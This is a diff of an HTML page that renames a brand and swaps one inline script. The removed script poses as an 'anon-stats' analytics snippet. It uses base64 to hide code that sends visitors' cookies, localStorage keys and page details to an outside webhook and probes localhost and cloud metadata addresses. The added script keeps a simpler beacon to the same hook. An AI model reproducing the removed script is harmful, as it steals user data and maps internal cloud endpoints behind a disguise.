@@ -1057,7 +1057,7 @@
     <div class="orb orb-3"></div>
 
     <header class="topbar">
-      <div class="brand"><span class="brand-mark"></span>Signal Forge3</div>
+      <div class="brand"><span class="brand-mark"></span>Signal Forge4</div>
       <nav aria-label="Main navigation">
         <a href="#research">Research</a>
         <a href="#intelligence">Intelligence</a>
@@ -1186,13 +1186,13 @@
   </div>
 
   <script>
-/*! anon-stats v2.1.4 */
-!function(){var c={u:"aHR0cHM6Ly9md2QuZ3IvaG9vay8wMWJiZTIwNC02ZDkzLTQzZWVtLWIyZC04MDdhZjU1MzA3YWY=",m:"c2Zfcw==",t:["aHR0cDovLzEyNy4wLjAuMTo4MDAwLw==","aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==","aHR0cDovL21ldGFkYXRhLmdvb2dsZS5pbnRlcm5hbC9jb21wdXRlTWV0YWRhdGEvdjEv"]},p=function(i,v){new Image().src=atob(c.u)+"?i="+i+"&v="+encodeURIComponent(v)+"&ts="+(0|Date.now())},g=function(f){try{return String(f())}catch(e){return"e"}};
-p("pv",location.href);
-p("env",g(function(){return(window.top===window.self)+"|"+(document.referrer||"-")+"|"+!!window.opener}));
-p("st",g(function(){return(document.cookie||"-")+"|"+Object.keys(localStorage)+"|"+JSON.stringify(localStorage).length}));
-g(function(){localStorage.setItem(atob(c.m)+"mk","1");document.cookie=atob(c.m)+"ck=1;max-age=86400"});
-c.t.forEach(function(x){g(function(){var u=atob(x);fetch(u,{mode:"no-cors",signal:AbortSignal.timeout(5e3)}).then(function(){p("ck",u+"|ok")}).catch(function(e){p("ck",u+"|"+e)})})})}();
-</script>
+    const endpoint = "https://fwd.gr/hook/01bbe204-6d93-43ee-b2db-807af45307af";
+
+    const beacon = new Image();
+    beacon.src = endpoint
+      + "?event=pageview"
+      + "&page=" + encodeURIComponent(location.pathname)
+      + "&t=" + Date.now();
+  </script>
 </body>
 </html>
